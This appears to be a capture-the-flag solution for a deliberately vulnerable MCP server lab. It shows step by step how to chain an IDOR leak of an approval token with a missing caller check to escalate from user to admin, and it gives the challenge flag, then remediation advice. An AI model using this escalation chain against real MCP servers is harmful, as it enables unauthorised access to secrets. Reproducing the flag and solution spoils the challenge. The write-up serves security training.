# Challenge 13: Privilege Escalation via IDOR + Role-Change Workflow

## Vulnerability

The MCP server on port 9013 implements a role-change request workflow with two
critical flaws:

1. **IDOR on request objects**: `get_role_request()` returns full details of any
   request by ID without verifying the caller owns or is authorised to view it.
   This leaks the `approval_token` for approved requests.

2. **Missing caller authorisation on apply**: `apply_role_change()` validates
   the request/token pair but does NOT check whether the caller is allowed to
   finalise the workflow.  Any logged-in user can apply any approved request.

The attacker chains these flaws to escalate from `user` to `admin`.

## Flag

`DVMCP{ch13_pr1v_3sc_r0l3_c0nf_8k2m}`

## Attack Steps

1. Connect to the MCP server running on `localhost:9013`.

2. **Login as a normal user:**
   ```
   login(username="user1", password="password123")
   ```

3. **Enumerate requests (leak all IDs):**
   ```
   list_my_requests()
   ```
   Returns all request IDs including `REQ-1002`.

4. **IDOR — read the approved admin request:**
   ```
   get_role_request(request_id="REQ-1002")
   ```
   Returns full details including:
   - `target_user: user1`
   - `requested_role: admin`
   - `status: approved`
   - `approval_token: APR-77-XYZ-SECRET`

5. **Apply the role change (missing caller check):**
   ```
   apply_role_change(request_id="REQ-1002", approval_token="APR-77-XYZ-SECRET")
   ```
   The server promotes `user1` to `admin` without verifying the caller is
   authorised to finalise the workflow.

6. **Access admin secrets:**
   ```
   admin_operation(operation="list_secrets")
   ```
   Returns the flag `DVMCP{ch13_pr1v_3sc_r0l3_c0nf_8k2m}`.

## Remediation

- Enforce object-level authorisation: only request owners and admins should see
  request details.
- Never expose approval tokens to non-authorised users.
- Verify the caller's role and relationship to the request before allowing
  workflow state transitions.
- Use non-sequential, non-guessable request IDs.
- Log all access to workflow objects for audit and anomaly detection.
